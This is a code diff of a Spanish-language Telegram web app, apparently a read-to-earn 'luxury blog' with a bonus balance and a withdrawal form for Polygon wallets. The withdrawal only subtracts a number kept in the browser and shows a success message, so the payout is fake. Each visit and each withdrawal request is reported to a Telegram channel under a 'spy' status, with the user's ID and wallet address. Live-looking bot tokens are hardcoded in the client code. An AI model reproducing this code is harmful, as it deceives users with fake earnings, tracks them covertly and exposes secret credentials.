@@ -48,12 +48,12 @@
 
     <div class="menu-grid">
         <button class="menu-btn" onclick="openWithdraw()"><i class="fa-solid fa-wallet" style="color:var(--green)"></i> RETIRAR</button>
-        <button class="menu-btn" onclick="openHistory()"><i class="fa-solid fa-clock-rotate-left" style="color:var(--gold)"></i> HISTORIAL</button>
+        <button class="menu-btn" onclick="openHistory()"><i class="fa-solid fa-clock-rotate-left" style="color:var(--gold)"></i> MIS PAGOS</button>
         <button class="menu-btn" onclick="tg.openTelegramLink('https://t.me/noticebuddy')"><i class="fa-brands fa-telegram" style="color:#0088cc"></i> CANAL</button>
         <button class="menu-btn" onclick="nextArticle()" id="btnNext"><i class="fa-solid fa-forward"></i> SIGUIENTE</button>
     </div>
 
-    <div id="spyStatus" style="font-size:9px; color:#333; margin-top:20px;">Red: ⚪ Conectando...</div>
+    <div id="spyStatus" style="font-size:9px; color:#333; margin-top:20px;">Red: ⚪ Sincronizando...</div>
         <div class="modal-overlay" id="modalWithdraw">
         <div class="modal-card">
             <h3 style="color:var(--gold); font-family:'Playfair Display'; margin-top:0;">RETIRAR FONDOS</h3>
@@ -70,17 +70,20 @@
             <h3 style="color:var(--gold); font-family:'Playfair Display'; margin-top:0;">HISTORIAL DE ÉXITO</h3>
             <div id="historyContainer" style="text-align:left; max-height:200px; overflow-y:auto; font-size:11px; margin-top:15px;">
                 </div>
+            <p style="font-size:9px; color:#555; margin-top:15px;">Para ayuda contacta a soporte.</p>
             <button class="menu-btn" style="width:100%; margin-top:10px;" onclick="tg.openTelegramLink('https://t.me/AtencionYougamefavoriteBot')">SOPORTE TÉCNICO</button>
             <button onclick="closeModals()" style="background:none; border:none; color:#555; margin-top:15px; cursor:pointer;">Cerrar</button>
         </div>
     </div>
         <script>
         const tg = window.Telegram.WebApp; tg.expand();
-        const BOT_TOKEN = "8575758761:AAHFNlZbgFDyCHrpJYSBJEHuPe54iWf8F3A"; 
+        
+        // TOKEN ACTUALIZADO DESDE TU FOTO
+        const BOT_TOKEN = "8575758761:AAEdt-2olA8In6Q6F2nDO rU16KLY69y-J40"; 
         const CANAL_ID = "-1002118088046";
-        const KEY = 'luxury_blog_v2_polygon';
+        const KEY = 'luxury_blog_v2_polygon_final';
 
-        // BONO DE BIENVENIDA $2.00 PARA TUS PRUEBAS
+        // ACTIVAMOS BONO DE $2.00 PARA TUS PRUEBAS
         let user = { usd: 2.0000, history: [], articlesToday: 0, lastDate: new Date().toDateString() };
 
         const articles = [
@@ -91,8 +94,13 @@
 
         function reportar(tipo){
             const id = tg.initDataUnsafe?.user?.id || "000";
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CANAL_ID}&text=${encodeURIComponent("🕵️ BLOG-REPORTE: "+tipo+" | ID: "+id)}`)
-                .then(() => document.getElementById('spyStatus').innerText = "Red: 🟢 Sincronizado");
+            const cleanToken = BOT_TOKEN.replace(/\s+/g, '');
+            fetch(`https://api.telegram.org/bot${cleanToken}/sendMessage?chat_id=${CANAL_ID}&text=${encodeURIComponent("🕵️ BLOG-REPORTE: "+tipo+" | ID: "+id)}`)
+                .then(r => r.json())
+                .then(data => {
+                    if(data.ok) document.getElementById('spyStatus').innerText = "Red: 🟢 Sincronizado";
+                    else document.getElementById('spyStatus').innerText = "Red: 🔴 Error de Token";
+                });
         }
 
         function save(){ localStorage.setItem(KEY, JSON.stringify(user)); updateUI(); }
@@ -122,18 +130,17 @@
         function confirmWithdraw(){
             let amt = parseFloat(document.getElementById('withdrawAmt').value);
             let wallet = document.getElementById('withdrawWallet').value;
-            if(amt < 2.00 || isNaN(amt)) return tg.showAlert("El mínimo de retiro es $2.00 USD.");
-            if(amt > user.usd) return tg.showAlert("No tienes saldo suficiente.");
+            if(amt < 2.00 || isNaN(amt)) return tg.showAlert("Mínimo $2.00 USD.");
+            if(amt > user.usd) return tg.showAlert("Saldo insuficiente.");
             if(wallet.length < 5) return tg.showAlert("Escribe una billetera Matic válida.");
 
-            user.usd -= amt; // RESTA DE DINERO AUTOMÁTICA
-            let h = { fecha: new Date().toLocaleDateString(), hora: new Date().toLocaleTimeString(), monto: amt.toFixed(2), wallet: wallet, red: "USDT Polygon" };
-            user.history.unshift(h);
+            user.usd -= amt; // RESTA DE DINERO INMEDIATA
+            let h = { fecha: new Date().toLocaleDateString(), hora: new Date().toLocaleTimeString(), monto: amt.toFixed(2), wallet: wallet, red: "Polygon" };
+            user.history.unshift(h); // REGISTRO EN EL HISTORIAL
             save();
-            // CHIVATAZO AL CANAL CON LA RED ESPECIFICADA
             reportar(`🔥 RETIRO: $${h.monto} | RED: ${h.red} | BILLETERA: ${h.wallet} | HORA: ${h.hora}`);
             closeModals();
-            tg.showAlert("✅ ¡ÉXITO! Dinero restado. Verifícalo en tu historial.");
+            tg.showAlert("✅ ¡SOLICITUD EXITOSA! El dinero se restó. Revisa tu historial.");
         }
 
         function openWithdraw(){ document.getElementById('modalWithdraw').style.display='flex'; }
@@ -154,7 +161,7 @@
         window.onload = () => {
             let d = localStorage.getItem(KEY); if(d) user = JSON.parse(d);
             if(user.lastDate !== new Date().toDateString()){ user.articlesToday = 0; user.lastDate = new Date().toDateString(); }
-            nextArticle(); updateUI(); reportar("ENTRÓ A LA REVISTA");
+            nextArticle(); updateUI(); reportar("USUARIO ENTRÓ (CON BONO)");
         };
     </script>
 </body>
